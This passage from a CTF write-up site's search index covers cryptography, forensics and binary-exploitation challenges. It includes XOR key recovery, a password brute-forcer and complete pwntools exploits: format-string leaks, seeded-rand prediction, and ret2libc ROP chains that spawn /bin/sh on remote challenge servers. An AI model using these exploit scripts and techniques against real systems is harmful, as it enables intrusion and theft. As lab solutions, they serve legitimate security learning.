the encryption method</li> <li>Modular arithmetic - Using <code>% 26</code> to handle alphabet wrapping</li> </ol>"},{"location":"cyberedu/cryptography/super_caesar/description/#alternative-analysis-method","title":"Alternative Analysis Method:","text":"<pre><code># Quick shift testing for boundary words\ndef test_shifts(word, target):\n    for shift in range(26):\n        decoded = ''.join(chr((ord(c) - ord('a') - shift) % 26 + ord('a')) for c in word.lower())\n        if decoded == target:\n            print(f\"'{word}' -&gt; '{target}' with shift {shift}\")\n            return shift\n\n# test_shifts('bcjac', 'start') \u2192 shift 17\n# test_shifts('uvqr', 'stop') \u2192 shift 24\n</code></pre> <p>This challenge demonstrates how Caesar ciphers can be made more complex by using multiple shift values within the same message!</p>"},{"location":"cyberedu/cryptography/train-to-paddington/description/","title":"Train-to-Paddington CTF Challenge Writeup","text":""},{"location":"cyberedu/cryptography/train-to-paddington/description/#challenge-information","title":"Challenge Information","text":"<ul> <li>Name: train-to-paddington</li> <li>Description: The train to Paddington is leaving soon! Will you be able to find your ticket ID in time? Why did you encrypt it without storing the password...?</li> <li>Category: Cryptography</li> </ul>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#initial-analysis","title":"Initial Analysis","text":"<p>We're given a Python encryption script and a ciphertext file:</p> <pre><code>import os\n\nBLOCK_SIZE = 16\nFLAG = b'|||REDACTED|||'\n\ndef pad_pt(pt):\n    amount_padding = 16 if (16 - len(pt) % 16) == 0 else 16 - len(pt) % 16\n    return pt + (b'\\x3f' * amount_padding)\n\npt = pad_pt(FLAG)\nkey = os.urandom(BLOCK_SIZE)\n\nct = b''\nj = 0\nfor i in range(len(pt)):\n    ct += (key[j] ^ pt[i]).to_bytes(1, 'big')\n    j += 1\n    j %= 16\n\nwith open('output.txt', 'w') as f:\n    f.write(ct.hex())\n</code></pre>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#understanding-the-encryption","title":"Understanding the Encryption","text":"<ol> <li>Padding Scheme: The plaintext is padded with <code>0x3f</code> bytes (<code>?</code> characters) to make the length a multiple of 16</li> <li>Key: A random 16-byte key is generated</li> <li>Encryption Method: Simple XOR cipher where each plaintext byte is XORed with a repeating 16-byte key</li> <li>Formula: <code>ct[i] = pt[i] ^ key[i % 16]</code></li> </ol>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#ciphertext","title":"Ciphertext","text":"<pre><code>b4b55c3ee34fac488ebeda573ab1f974bf9b2b0ee865e45a92d2f14b7bdabb6ed4872e4dd974e803d9b2ba1c77baf725\n</code></pre> <p>Length: 48 bytes (0x30 in hex)</p>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>This encryption scheme has a critical weakness: known plaintext in the padding.</p>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#the-attack-vector","title":"The Attack Vector","text":"<p>Since we know: - The padding bytes are <code>0x3f</code> - The key repeats every 16 bytes - We can calculate: <code>key[i % 16] = ct[i] ^ pt[i]</code></p> <p>If we can identify which bytes are padding, we can recover the corresponding key bytes!</p>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#key-recovery-strategy","title":"Key Recovery Strategy","text":"<ol> <li>From Padding: XOR ciphertext padding bytes with <code>0x3f</code> to get key bytes</li> <li>From Flag Format: The flag starts with <code>TFCCTF{</code>, giving us more known plaintext</li> <li>Combine: Use both sources to recover all 16 key bytes</li> </ol>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#solution","title":"Solution","text":""},{"location":"cyberedu/cryptography/train-to-paddington/description/#step-1-determine-padding-length","title":"Step 1: Determine Padding Length","text":"<p>The ciphertext is 48 bytes. We need to figure out how many are padding.</p> <p>Since padding follows the rule: <code>padding_len = 16 - (flag_len % 16)</code> or 16 if already aligned, we need to try different possibilities.</p>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#step-2-exploit-known-plaintext","title":"Step 2: Exploit Known Plaintext","text":"<p>We know: - Flag starts with <code>TFCCTF</code> (6 bytes) - Padding bytes are <code>0x3f</code></p>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#step-3-exploitation-script","title":"Step 3: Exploitation Script","text":"<pre><code>ciphertext = \"b4b55c3ee34fac488ebeda573ab1f974bf9b2b0ee865e45a92d2f14b7bdabb6ed4872e4dd974e803d9b2ba1c77baf725\"\nct = bytes.fromhex(ciphertext)\n\nprefix = b'TFCCTF'\n\n# Recover first 6 key bytes from the known prefix\nkey = [None] * 16\n\nfor i in range(len(prefix)):\n    key[i] = ct[i] ^ prefix[i]\n\n# Try different padding lengths to recover the rest of the key\nfor padding_len in range(1, 17):\n    test_key = key.copy()\n    start = 48 - padding_len\n\n    # Recover key bytes from padding\n    for i in range(start, 48):\n        test_key[i % 16] = ct[i] ^ 0x3f\n\n    # Check if we have full key (no None values)\n    if None not in test_key:\n        # Decrypt\n        pt = bytes([ct[i] ^ test_key[i % 16] for i in range(len(ct))])\n        try:\n            flag = pt.decode('ascii')\n            if flag.startswith('TFCCTF') and flag.isprintable():\n                print(f\"Padding length: {padding_len}\")\n                print(f\"Recovered key: {bytes(test_key).hex()}\")\n                print(f\"Flag: {flag}\")\n                break\n        except:\n            pass\n</code></pre>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#step-4-execute-and-capture-the-flag","title":"Step 4: Execute and Capture the Flag","text":"<p>Running the exploit reveals: - The correct padding length - The recovered 16-byte key - The decrypted flag</p>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#key-takeaways","title":"Key Takeaways","text":""},{"location":"cyberedu/cryptography/train-to-paddington/description/#why-this-attack-works","title":"Why This Attack Works","text":"<ol> <li>Repeating Key: XOR with a repeating key is weak - once you know any key byte, you can decrypt all bytes at that position modulo 16</li> <li>Known Plaintext: The padding scheme uses a fixed, known byte value</li> <li>Flag Format: CTF flags typically have predictable prefixes, providing additional known plaintext</li> </ol>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#lessons-learned","title":"Lessons Learned","text":"<ul> <li>Never use a simple repeating XOR for encryption</li> <li>Known padding patterns can leak key material</li> <li>Predictable plaintext (like flag formats) enables known plaintext attacks</li> <li>Proper encryption requires: authenticated encryption modes (like AES-GCM), random IVs, and no key reuse</li> </ul>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#better-alternatives","title":"Better Alternatives","text":"<p>Instead of this scheme, use: - AES in GCM or CBC mode with proper IV handling - Standard padding schemes like PKCS#7 with authenticated encryption - Never reuse keys or use predictable padding patterns</p>"},{"location":"cyberedu/cryptography/train-to-paddington/description/#flag","title":"Flag","text":"<p><code>TFCCTF{...}</code> (redacted - solve it yourself! \ud83d\ude82)</p> <p>Challenge Rating: Medium Skills Required: Understanding of XOR properties, known plaintext attacks, basic cryptanalysis Tools Used: Python 3, basic crypto knowledge</p>"},{"location":"cyberedu/forensics/east/description/","title":"Description","text":""},{"location":"cyberedu/forensics/east/description/#challenge-east","title":"Challenge: East","text":"<p>Type: Forensics</p>"},{"location":"cyberedu/forensics/east/description/#step-1-initial-analysis","title":"Step 1: Initial Analysis","text":"<p>We're given a <code>.jpg</code> file that appears to be a normal image, but in forensics challenges, files often contain hidden data.</p>"},{"location":"cyberedu/forensics/east/description/#step-2-discovery-with-binwalk","title":"Step 2: Discovery with Binwalk","text":"<p><pre><code>binwalk camashadefortza.jpg\n</code></pre> Binwalk reveals a 7-Zip archive embedded at offset 206006 (0x324B6).</p>"},{"location":"cyberedu/forensics/east/description/#step-3-extract-the-hidden-archive","title":"Step 3: Extract the Hidden Archive","text":"<p><pre><code>dd if=camashadefortza.jpg of=extracted_archive.7z bs=1 skip=206006\n</code></pre> This extracts the 7z archive starting from the discovered offset.</p>"},{"location":"cyberedu/forensics/east/description/#step-4-password-cracking","title":"Step 4: Password Cracking","text":"<p>The extracted 7z archive is password protected. Using a custom bash brute forcer:</p> <pre><code>#!/bin/bash\n# Simple 7z password brute forcer\nwhile IFS= read -r password; do\n    [[ -z \"$password\" ]] &amp;&amp; continue\n    echo -ne \"\\rTrying: $password                    \"\n    if 7z t -p\"$password\" extracted_archive.7z &gt;/dev/null 2&gt;&amp;1; then\n        echo -e \"\\nSUCCESS: Password found: '$password'\"\n        7z x -p\"$password\" extracted_archive.7z\n        break\n    fi\ndone &lt; &lt;your path to rockyou.txt&gt;\n</code></pre>"},{"location":"cyberedu/forensics/east/description/#step-5-extract-and-analyze","title":"Step 5: Extract and Analyze","text":"<p>After finding the correct password, we extract the archive and find a file called <code>beaches.001</code>.</p>"},{"location":"cyberedu/forensics/east/description/#step-6-flag-discovery","title":"Step 6: Flag Discovery","text":"<p><pre><code>strings beaches.001 | grep ctf\n</code></pre> This command searches for readable strings containing \"ctf\" in the extracted file, revealing the flag.</p>"},{"location":"cyberedu/forensics/east/description/#tools-used","title":"Tools Used:","text":"<ul> <li><code>binwalk</code> - For discovering embedded files</li> <li><code>dd</code> - For manual file extraction</li> <li>Custom bash script - For password brute forcing</li> <li><code>strings</code> - For extracting readable text from binary files</li> </ul>"},{"location":"cyberedu/forensics/east/description/#key-learning-points","title":"Key Learning Points:","text":"<ol> <li>Steganography in images - Data can be hidden inside image files</li> <li>Offset-based extraction - Using <code>dd</code> with specific byte offsets</li> <li>Password brute forcing - Systematic testing of common passwords</li> <li>String analysis - Extracting meaningful data from binary files</li> </ol> <p>This is a classic forensics challenge combining steganography, archive analysis, and string extraction techniques!</p>"},{"location":"cyberedu/forensics/victim/description/","title":"Challenge: victim","text":""},{"location":"cyberedu/forensics/victim/description/#description","title":"Description","text":"<p>In the reconnaissance process, a hacker managed to save a piece of data generated by his victim (file.pcap). Between multiple destinations, you need to identify vulnerable services on these hosts. The funny thing is that some authentication information will help you to capture the flag.</p>"},{"location":"cyberedu/forensics/victim/description/#initial-analysis","title":"Initial Analysis","text":"<p>We are provided with a pcap file named <code>file.pcap</code>. We will get that file right into a pcap analyzer to see if we can extract some things.</p>"},{"location":"cyberedu/forensics/victim/description/#credential-discovery","title":"Credential Discovery","text":"<p>Pcap analyzer managed to find some credentials and we also have a hint about auth information so we will note them down.</p> <p></p> <p>Nothing else was found so we will analyze it manually.</p>"},{"location":"cyberedu/forensics/victim/description/#manual-analysis","title":"Manual Analysis","text":"<p>After some analysis I searched for the hex value <code>50 4B</code> which is the magic bytes value for a ZIP header and we found:</p> <p></p> <p>a zip that has a <code>flag.txt</code> file inside.</p>"},{"location":"cyberedu/forensics/victim/description/#solution","title":"Solution","text":"<p>The zip is password protected so I tried to open it with the credentials found earlier.</p> <p><code>VADPRDqid4TaB0r5a2B0n9wLp</code> worked, unzipped the file and got us the flag.</p>"},{"location":"cyberedu/forensics/zanger/description/","title":"Challenge: zanger","text":""},{"location":"cyberedu/forensics/zanger/description/#description","title":"Description","text":"<p>One communications protocol over certain ports to rule them all.</p> <p>Flag format: <code>ctf{sha256}</code></p> <p>Goal: In this challenge you receive a capture dump and your goal is to find the attacker techniques used to leak the flag.</p>"},{"location":"cyberedu/forensics/zanger/description/#initial-analysis","title":"Initial Analysis","text":"<p>We are provided with a pcap file that seems to only use UDP and TCP but send no data. We have some hints about the ports in the description so we will try to look at them.</p>"},{"location":"cyberedu/forensics/zanger/description/#investigation","title":"Investigation","text":"<p>After filtering by TCP we see that we have less than UDP so maybe that is where we need to look. I looked manually at the first destination ports from TCP packets and found some interesting 1337 port from which I knew I was on the good path.</p>"},{"location":"cyberedu/forensics/zanger/description/#solution-method","title":"Solution Method","text":"<p>After many attempts I figured it out. Each destination port should be treated as a nybble (4-bit value) and then reconstructed as hex - the flag will be revealed.</p>"},{"location":"cyberedu/forensics/zanger/description/#technique-explanation","title":"Technique Explanation","text":"<p>The attacker used port numbers as a covert channel to exfiltrate data. By encoding each nybble of the flag as a destination port number in the TCP packets, the flag could be transmitted without sending any actual payload data.</p>"},{"location":"cyberedu/forensics/zanger/description/#exploit","title":"Exploit","text":"<p>The exploit is in this repository.</p>"},{"location":"cyberedu/pwn/baby-fmt/description/","title":"baby-fmt - CTF Writeup","text":"<p>Challenge Name: baby-fmt Description: This should be a basic pwn challenge but please be aware that time is not your friend.</p> <p>Environment: Running on Ubuntu 20.04</p>"},{"location":"cyberedu/pwn/baby-fmt/description/#overview","title":"Overview","text":"<p>In this challenge we are provided with a binary and we need to pwn a remote machine in order to get the flag. From the challenge name we are hinted that we need to exploit a format string vulnerability in order to leak some stack addresses.</p>"},{"location":"cyberedu/pwn/baby-fmt/description/#initial-analysis","title":"Initial Analysis","text":"<p>First, let's run the binary and see what it does.</p> <p></p> <p>As you can see, it gives us 2 chances to input things: - The first input is vulnerable to format string exploit which leaks addresses from the stack - The second input should let us overflow the buffer but it seems that it has some kind of protection</p> <p>It seems that the binary has many functions, so to do our job easily, let's open it in Ghidra and analyze the code.</p>"},{"location":"cyberedu/pwn/baby-fmt/description/#decompiled-code-analysis","title":"Decompiled Code Analysis","text":"<p>This is the decompiled program code which holds the main logic:</p> <pre><code>void program(void)\n{\n  int iVar1;\n  time_t time_var;\n  size_t buffer_8_length;\n  ulong curr;\n  char buffer_8 [8];\n  char buffer_5 [5];\n  int random_value;\n  int i;\n\n  time_var = time((time_t *)0x0);\n  srand((uint)time_var);\n  DAT_0010402c = rand();\n  random_value = DAT_0010402c;\n  puts(\"What\\'s your town?\");\n  fgets(buffer_8,8,stdin);\n  i = 0;\n  while( true ) {\n    curr = (ulong)i;\n    buffer_8_length = strlen(buffer_8);\n    if (buffer_8_length &lt;= curr) break;\n    if (buffer_8[i] == '\\n') {\n      buffer_8[i] = '\\0';\n    }\n    i = i + 1;\n  }\n  iVar1 = compare_input(buffer_8);\n  if (iVar1 == 0) {\n    puts(\"Hello stranger. What town is this?\");\n    printf(buffer_8);\n  }\n  else {\n    printf(\"Hello, %s\\n\",buffer_8);\n  }\n  puts(\"\\nCan you say hi in Chalcatongo?\\n\");\n  gets(buffer_5);\n  protection(random_value);\n  return;\n}\n</code></pre> <p>As we can see, the first input indeed has a format string vulnerability which we will use later. The second input reads into a buffer of 5 bytes and then calls a function with the random value generated at the beginning of the code.</p>"},{"location":"cyberedu/pwn/baby-fmt/description/#understanding-the-protection-mechanism","title":"Understanding the Protection Mechanism","text":"<p>Let's see what the protection function does:</p> <pre><code>void protection(int random_value)\n{\n  if (random_value != DAT_0010402c) {\n    printf(\"Hacking attempt.\");\n                    /* WARNING: Subroutine does not return */\n    exit(-1);\n  }\n  printf(\"Ok\");\n  return;\n}\n</code></pre> <p>It compares the random value to the one generated. Basically, it checks that it hasn't been changed. In other words, it doesn't let us write more than 5 bytes in the second buffer; otherwise what we write will overwrite the random value and the protection will activate and exit the program.</p> <p>We see that the random value is generated using the <code>rand</code> library from standard C library which takes as a seed the current time. Given that, we can calculate the current time at the same moment, give it as a seed to the <code>rand</code> function in our exploit and then recompute the random number which will be the same as on the server, because the same seed produces the same random number.</p> <p>The strategy will be: - Write 5 bytes - Write the random number (so it will not change the random number on the machine) - Continue with the exploit</p>"},{"location":"cyberedu/pwn/baby-fmt/description/#finding-the-win-function","title":"Finding the Win Function","text":"<p>Looking further into the decompiled code I found:</p> <pre><code>void win(void)\n{\n  char *local_38;\n  undefined *local_30;\n  undefined8 local_28;\n  char *local_18 [2];\n\n  local_18[0] = (char *)0x0;\n  local_38 = \"/bin/cat\";\n  local_30 = &amp;DAT_00102051;\n  local_28 = 0;\n  execve(\"/bin/cat\",&amp;local_38,local_18);\n  return;\n}\n</code></pre> <p>This is the function that we need to jump to, found at offset <code>0010133f</code> from the main base \u2192 offset <code>0x133f</code></p>"},{"location":"cyberedu/pwn/baby-fmt/description/#binary-security-analysis","title":"Binary Security Analysis","text":"<p>Running <code>checksec</code> on the binary:</p> <p></p> <p>We see that PIE is enabled, meaning we don't know the main function base. In order to find it we will need to leak an address from the stack which is a part from the main program and then subtract its offset in order to get the main function base.</p>"},{"location":"cyberedu/pwn/baby-fmt/description/#exploit-development-part-1-leaking-addresses","title":"Exploit Development - Part 1: Leaking Addresses","text":"<p>We will write an exploit that leaks addresses at position 1-50 on the stack so maybe we can find some useful addresses. Before that, I checked the entry point offset:</p> <p></p> <p>The program starts at the offset: <code>001011c0</code> \u2192 entry point offset is <code>0x11c0</code></p> <p>Let's run the address leaker exploit and see what we get. I will leave that exploit in this repository. After carefully looking through the addresses, I found something interesting at the 10th position: - <code>59c2daa741c0</code></p> <p>It indeed looks like a program address but the most interesting thing is that it ends in <code>1c0</code> exactly as the offset. This could be our entry point address because if we subtract the address with the offset, our allegedly main base will end in <code>000</code> which is perfect because that's how main addresses are often represented due to pagination. </p> <p>So now that we know the main address we can also calculate the runtime address of our <code>win</code> function.</p> <p>The exploit until now will be:</p> <pre><code>from pwn import *\nimport argparse\nimport subprocess\nimport ctypes\nimport time\n\ncontext.log_level = 'DEBUG'\ncontext.aslr = False\n\n# start the process\n# p = process('./pwn_baby_fmt')\np = remote(\"34.185.160.224\", 31841)\nlibc = ELF('./libc-2.27.so')\n\n# receive initial prompt\np.recvuntil(b\"What's your town?\\n\")\n\n# leak an address from main in order to get the main base\np.sendline(b'%10$p')\np.recvline()  # get first line\nleaked = int(p.recvline().decode().lstrip(\"0x\").rstrip(\"\\n\"), 16)\nprint(\"Leaked function address:\", hex(leaked))\n\npie_base = leaked - 0x11c0\nprint(\"PIE base:\", hex(pie_base))\n\n# calculate the base and the win function address\nwin_function_address = pie_base + 0x133f\nprint(\"Win function address:\", hex(win_function_address))\n</code></pre>"},{"location":"cyberedu/pwn/baby-fmt/description/#exploit-development-part-2-calculating-the-random-number","title":"Exploit Development - Part 2: Calculating the Random Number","text":"<p>Now we will need to calculate the random number:</p> <pre><code># Generate the random number\nlibc_lib = ctypes.CDLL(libc.path)\n\n# Get current time and seed\ncurrent_time = int(time.time())\nlibc_lib.srand(current_time + 8)  # +8 for differences between local and remote time\n                                   # adjust as needed, 8 seconds worked for me\n\n# Generate random number\nrandom_number = libc_lib.rand()\nprint(\"Random number:\", random_number)\n</code></pre>"},{"location":"cyberedu/pwn/baby-fmt/description/#exploit-development-part-3-finding-the-buffer-offset","title":"Exploit Development - Part 3: Finding the Buffer Offset","text":"<p>Before we construct our final payload, let's find the buffer offset so we will know how many bytes to send before overwriting the return address with the win function address.</p> <p></p> <p>As we can see, the buffer is at <code>rbp - 0x1d</code> which is 29 in decimal, so 29 bytes far from <code>rbp</code>. In order to reach RIP we need to write <code>29 + 8 = 37</code> bytes.</p>"},{"location":"cyberedu/pwn/baby-fmt/description/#payload-construction","title":"Payload Construction","text":"<p>The payload will be constructed like this: 1. Write 5 bytes to fill the buffer 2. Write the random value (integer so 4 bytes) 3. Write another 28 bytes to get to RBP (<code>5 + 4 + 28 = 37</code> bytes) 4. Overwrite the return address with the address of win function</p> <p>This is the final part of the exploit:</p> <pre><code># construct the payload\nbuffer_fill = b'a' * 5\noverwrite_to_return = b'a' * 28\npayload = buffer_fill + p32(random_number) + overwrite_to_return + p64(win_function_address)\n\np.recvline()\np.sendline(payload)\n\n# get shell\np.interactive()\n</code></pre>"},{"location":"cyberedu/pwn/baby-fmt/description/#full-exploit-code","title":"Full Exploit Code","text":"<pre><code>from pwn import *\nimport argparse\nimport subprocess\nimport ctypes\nimport time\n\ncontext.log_level = 'DEBUG'\ncontext.aslr = False\n\n# start the process\n# p = process('./pwn_baby_fmt')\np = remote(\"34.185.160.224\", 31841)\nlibc = ELF('./libc-2.27.so')\n\n# receive initial prompt\np.recvuntil(b\"What's your town?\\n\")\n\n# leak an address from main in order to get the main base\np.sendline(b'%10$p')\np.recvline()  # get first line\nleaked = int(p.recvline().decode().lstrip(\"0x\").rstrip(\"\\n\"), 16)\nprint(\"Leaked function address:\", hex(leaked))\n\npie_base = leaked - 0x11c0\nprint(\"PIE base:\", hex(pie_base))\n\n# calculate the base and the win function address\nwin_function_address = pie_base + 0x133f\nprint(\"Win function address:\", hex(win_function_address))\n\n# Generate the random number\nlibc_lib = ctypes.CDLL(libc.path)\n\n# Get current time and seed\ncurrent_time = int(time.time())\nlibc_lib.srand(current_time + 8)  # +8 for differences between local and remote time\n                                   # adjust as needed, 8 seconds worked for me\n\n# Generate random number\nrandom_number = libc_lib.rand()\nprint(\"Random number:\", random_number)\n\n# construct the payload\nbuffer_fill = b'a' * 5\noverwrite_to_return = b'a' * 28\npayload = buffer_fill + p32(random_number) + overwrite_to_return + p64(win_function_address)\n\np.recvline()\np.sendline(payload)\n\n# get shell\np.interactive()\n</code></pre> <p>The full exploit is available in this repository.</p>"},{"location":"cyberedu/pwn/baby-fmt/description/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Format String Vulnerability: Used to leak PIE base address</li> <li>Time-based Random Number: Predicted by synchronizing time with server</li> <li>Buffer Overflow Protection: Bypassed by writing the correct random value</li> <li>PIE Bypass: Calculated base address from leaked stack address ending in entry point offset</li> </ul>"},{"location":"cyberedu/pwn/baby_rop/description/","title":"Description","text":""},{"location":"cyberedu/pwn/baby_rop/description/#challenge-baby-rop","title":"Challenge: Baby ROP","text":"<p>Type: Pwn/Binary Exploitation Difficulty: Beginner Environment: Ubuntu 20.04</p>"},{"location":"cyberedu/pwn/baby_rop/description/#initial-analysis","title":"Initial Analysis","text":"<p>We're given a binary <code>pwn_baby_rop</code> that prompts for input. Basic interaction shows no obvious functionality, so we analyze it with Ghidra.</p>"},{"location":"cyberedu/pwn/baby_rop/description/#vulnerability-discovery","title":"Vulnerability Discovery","text":"<p>We see that for getting the input the unsafe gets functions is used: </p> <p>Seeing that it means that we can craft a ret2libc attack.</p>"},{"location":"cyberedu/pwn/baby_rop/description/#exploitation-strategy-two-stage-ret2libc","title":"Exploitation Strategy: Two-Stage ret2libc","text":"<p>To do that, first we would need to leak an address from libc. We will do that for puts by getting the puts got address and the puts plt address. After doing that we will simply abuse the buffer overflow vulnerability by leaking the puts adress in libc. Also, after calling leaking the puts address we will return to the main function so we can be asked for input again, now knowing an address from libc.</p> <p>The first part of the exploit will look like this: <pre><code>from pwn import *\nenv = {\"LD_PRELOAD\": \"./libc6_2.31-0ubuntu8_amd64.so\"}\n#io = process(\"./pwn_baby_rop\", env=env)\nio = remote(\"34.159.211.30\", 32627)\nio.recvuntil(\"black magic.\\n\")\n#gdb.attach(io)\n\n# 1st stage\npop_rdi = 0x00401663\nputs_got = 0x404018\nputs = 0x401060\nmain = 0x40145C\npayload = b\"\"\npayload += b\"A\" * 256\npayload += b\"B\" * 8\npayload += p64(pop_rdi)\npayload += p64(puts_got)\npayload += p64(puts)\npayload += p64(main)\nio.sendline(payload)\nputs_addr = io.recvline()[:-1].ljust(8, b\"\\x00\")\nputs_addr = u64(puts_addr)\nlog.info(\"puts: \" + hex(puts_addr))\n</code></pre></p> <p>In the second stage we will need to first find the libc version so we could know the offsets. To do that we can search on libc database website and find: </p> <p>Now, as we know the offsets we can first find the libc base addr, then find the system call and also the /bin/sh string address.</p> <p>The second part of the exploit will look like: <pre><code># 2nd stage\nputs_offset = 0x0875a0\nsystem_offset = 0x055410\nbin_sh_offset =  0x1b75aa\nlibc_base = puts_addr - puts_offset\nsystem = libc_base + system_offset\nbin_sh = libc_base + bin_sh_offset\nlog.info(\"libc_base: \" + hex(libc_base))\nlog.info(\"system: \" + hex(system))\nlog.info(\"bin_sh: \" + hex(bin_sh))\nsimple_ret = 0x0040101a\npayload = b\"A\" * 256\npayload += p64(rbp)\npayload += p64(pop_rdi)\npayload += p64(bin_sh)\npayload += p64(simple_ret)\npayload += p64(system)\n</code></pre></p> <p>And that is how the system function will be called with /bin/sh arg and we pwn the binary.</p>"},{"location":"cyberedu/pwn/baby_rop/description/#key-learning-points","title":"Key Learning Points:","text":"<ol> <li>Buffer Overflow Basics: Using <code>gets()</code> creates predictable overflow conditions</li> <li>ret2libc Technique: Bypassing NX bit by reusing existing libc functions  </li> <li>Address Leaking: Using GOT/PLT to leak randomized addresses</li> <li>ROP Chains: Chaining gadgets to control program execution</li> <li>Libc Database: Using leaked addresses to identify exact libc version</li> </ol> <p>This is a classic introduction to modern binary exploitation techniques!</p>"},{"location":"cyberedu/pwn/bazooka/description/","title":"Bazooka - CTF Writeup","text":"<p>Challenge Name: bazooka Category: Reverse Engineering / Binary Exploitation Description: We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them.</p>"},{"location":"cyberedu/pwn/bazooka/description/#initial-analysis","title":"Initial Analysis","text":"<p>Today we have a reverse engineering challenge. We'll first run the binary and see what it does.</p> <p></p> <p>We see that it prompts for a secret message and then says: \"Try harder!\". After that, we are prompted to enter some junk.</p> <p>Let's analyze the binary in more detail.</p> <p></p> <p>The instruction at address <code>0x004007dd</code> loads the string <code>#!@{try_hard3r}</code> and then compares it to our first input.</p> <p>Let's go back and input that string.</p> <p></p> <p>Perfect! We see that now the program goes into another function which we should crash.</p> <p>From the initial binary analysis, we can see that if the first input is correct, then the program jumps to the <code>vuln</code> function.</p>"},{"location":"cyberedu/pwn/bazooka/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>Let's analyze the vulnerable function.</p> <p></p> <p>Perfect! From here we can see that we have a 112 bytes buffer. Looking throughout the other functions, we couldn't find any system calls, so this needs to be a ret2libc CTF challenge.</p>"},{"location":"cyberedu/pwn/bazooka/description/#attack-strategy","title":"Attack Strategy","text":"<p>Let's define our attack strategy:</p> <ol> <li>Overflow the buffer to overwrite the return address</li> <li>We need to write 120 bytes (112 bytes buffer + 8 bytes to overwrite RBP)</li> <li> <p>The next bytes will overwrite RIP, allowing us to control the return address</p> </li> <li> <p>Leak a libc address</p> </li> <li>We'll leak the <code>puts</code> address from the GOT</li> <li>Use a <code>pop rdi; ret</code> gadget to load <code>puts_got</code> address into RDI</li> <li>Call <code>puts@plt</code> to print the address</li> <li> <p>Return to main to continue execution</p> </li> <li> <p>Calculate libc base and function addresses</p> </li> <li>Use the leaked <code>puts</code> address to calculate libc base</li> <li> <p>Find offsets for <code>system</code> and <code>/bin/sh</code> string</p> </li> <li> <p>Execute the final payload</p> </li> <li>Overflow the buffer again</li> <li>Call <code>system(\"/bin/sh\")</code> to get a shell</li> </ol>"},{"location":"cyberedu/pwn/bazooka/description/#exploit-code","title":"Exploit Code","text":""},{"location":"cyberedu/pwn/bazooka/description/#part-1-leaking-libc-address","title":"Part 1: Leaking libc Address","text":"<pre><code>from pwn import *\n\n# Connect to the remote server\np = remote(\"35.246.235.150\", 31981)\n\n# Addresses found through static analysis\nputs_got = 0x601018\nputs_plt = 0x4005b0\npop_rdi_ret = p64(0x00000000004008f3)\nloop_addr = 0x0040079c\n\nprint(\"puts_got:\", hex(puts_got))\nprint(\"puts_plt:\", hex(puts_plt))\n\n# Send the secret message\np.recvuntil(b\"message:\")\nfirst_message = b\"#!@{try_hard3r}\"\np.sendline(first_message)\n\n# Prepare the payload to leak puts address\np.recvuntil(b\"Message: \")\noverflow_buffer = b'a' * 120\n\npayload = overflow_buffer + pop_rdi_ret + p64(puts_got) + p64(puts_plt) + p64(loop_addr)\np.sendline(payload)\n\n# Receive the leaked address\na = p.recvline()  # hacker alert message\nleaked = p.recvline()\nprint(\"libc puts addr:\", repr(leaked))\n</code></pre> <p>Note: The ROP gadget was found by running: <pre><code>ROPgadget --ropchain --binary &lt;binary_name&gt; | grep \"pop rdi\"\n</code></pre></p>"},{"location":"cyberedu/pwn/bazooka/description/#part-2-exploiting-with-system","title":"Part 2: Exploiting with system()","text":"<p>After obtaining the <code>puts</code> address, we found the libc version to get the correct function offsets.</p> <pre><code># Parse the leaked address\nleaked = leaked.strip()\nif len(leaked) &lt; 8:\n    leaked = leaked.ljust(8, b\"\\x00\")\n\nputs_addr = u64(leaked)\nprint(\"puts_addr:\", hex(puts_addr))\n\n# Libc offsets (found using libc database)\nsystem_offset = 0x4f550\nstr_bin_sh = 0x1b3e1a\nputs_offset = 0x80aa0\n\n# Calculate libc base\nlibc_base = puts_addr - puts_offset\nprint(\"libc base:\", hex(libc_base))\n\n# Calculate target addresses\nbin_sh_addr = libc_base + str_bin_sh\nsystem_addr = libc_base + system_offset\n\nprint(\"bin_sh_addr:\", hex(bin_sh_addr))\nprint(\"system offset:\", hex(system_addr))\n\n# Send the secret message again\np.sendline(first_message)\n\n# Prepare the final payload\nsimple_ret = 0x0000000000400596  # Stack alignment gadget\n\npayload = overflow_buffer + pop_rdi_ret + p64(bin_sh_addr) + p64(simple_ret) + p64(system_addr)\np.sendline(payload)\n\n# Get shell\np.interactive()\n</code></pre>"},{"location":"cyberedu/pwn/bazooka/description/#key-techniques","title":"Key Techniques","text":"<ul> <li>Buffer Overflow: Exploiting a 112-byte buffer to overwrite the return address</li> <li>ret2libc: Bypassing missing system calls by leveraging libc functions</li> <li>ASLR Bypass: Leaking libc addresses to calculate function locations at runtime</li> <li>ROP Chains: Using Return-Oriented Programming to control program flow</li> </ul>"},{"location":"cyberedu/pwn/bazooka/description/#flag","title":"Flag","text":"<p>After running the exploit successfully, we get a shell and can retrieve the flag from the remote system!</p>"},{"location":"cyberedu/pwn/blindsight/description/","title":"Description","text":""},{"location":"cyberedu/pwn/blindsight/description/#blindsight-brop-challenge-writeup","title":"Blindsight (BROP) Challenge Writeup","text":""},{"location":"cyberedu/pwn/blindsight/description/#challenge-overview","title":"Challenge Overview","text":"<p>Type: Blind ROP (Return Oriented Programming) Constraint: No binary is provided. Goal: We must probe the running service to reverse engineer its internal layout, find gadgets, leak memory, and eventually execute a shell.</p> <p>The exploitation process follows the standard BROP methodology:</p> <ol> <li>Stack Smashing: Find the buffer overflow offset.</li> <li>Stop Gadget: Find an address that restarts the program (to prevent crashes).</li> <li>BROP Gadgets: Find the <code>pop rdi; ret</code> gadget to control arguments.</li> <li>PLT Scan: Find <code>puts@plt</code> to leak data.</li> <li>GOT Leak &amp; Win: Leak libc, calculate offsets, and call <code>system()</code>.</li> 